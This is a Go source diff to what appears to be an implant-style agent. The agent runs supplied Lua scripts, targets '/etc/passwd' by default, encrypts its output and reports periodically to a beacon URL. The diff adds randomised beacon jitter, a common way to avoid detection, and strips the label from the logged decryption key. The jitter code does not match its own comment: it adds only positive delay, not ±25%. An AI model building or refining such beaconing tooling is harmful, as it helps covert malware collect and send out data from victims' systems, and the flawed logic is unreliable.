@@ -12,6 +12,7 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	mrand "math/rand"
 	"net/http"
 	"os"
 	"time"
@@ -24,15 +25,16 @@ import (
 var lockDefault string
 
 var (
-	execScript  = flag.String("execute", "", "base64-encoded lua script")
-	execFile    = flag.String("file", "", "execute lua script from file (legacy mode)")
-	hostFlag    = flag.String("host", "google.com", "host to probe")
-	portFlag    = flag.Int("port", 80, "port to probe")
-	fileFlag    = flag.String("file-target", "/etc/passwd", "target file")
-	beaconURL   = flag.String("beacon", "", "beacon URL for periodic reporting")
-	beaconInt   = flag.Duration("interval", 60*time.Second, "beacon interval")
-	beaconCount = flag.Int("count", 0, "beacon count (0=infinite)")
-	passphrase  = flag.String("key", "", "encryption passphrase (auto-generated if empty)")
+	execScript   = flag.String("execute", "", "base64-encoded lua script")
+	execFile     = flag.String("file", "", "execute lua script from file (legacy mode)")
+	hostFlag     = flag.String("host", "google.com", "host to probe")
+	portFlag     = flag.Int("port", 80, "port to probe")
+	fileFlag     = flag.String("file-target", "/etc/passwd", "target file")
+	beaconURL    = flag.String("beacon", "", "beacon URL for periodic reporting")
+	beaconInt    = flag.Duration("interval", 60*time.Second, "beacon interval")
+	beaconCount  = flag.Int("count", 0, "beacon count (0=infinite)")
+	beaconJitter = flag.Int("jitter", 25, "jitter percentage (0=disabled)")
+	passphrase   = flag.String("key", "", "encryption passphrase (auto-generated if empty)")
 )
 
 // genPassphrase creates a random 16-char passphrase
@@ -208,7 +210,7 @@ func main() {
 		pass = genPassphrase()
 	}
 	key := deriveKey(pass)
-	log.Printf("[*] Decryption key: %s", pass)
+	log.Println(pass)
 
 	runs := 0
 	for {
@@ -225,6 +227,13 @@ func main() {
 		if *beaconCount > 0 && runs >= *beaconCount {
 			break
 		}
-		time.Sleep(*beaconInt)
+
+		// default: 60s ± 25% jitter (45-75s random)
+		sleepTime := *beaconInt
+		if *beaconJitter > 0 {
+			maxJitter := int(*beaconInt) * (*beaconJitter) / 100
+			sleepTime += time.Duration(mrand.Intn(maxJitter))
+		}
+		time.Sleep(sleepTime)
 	}
 }
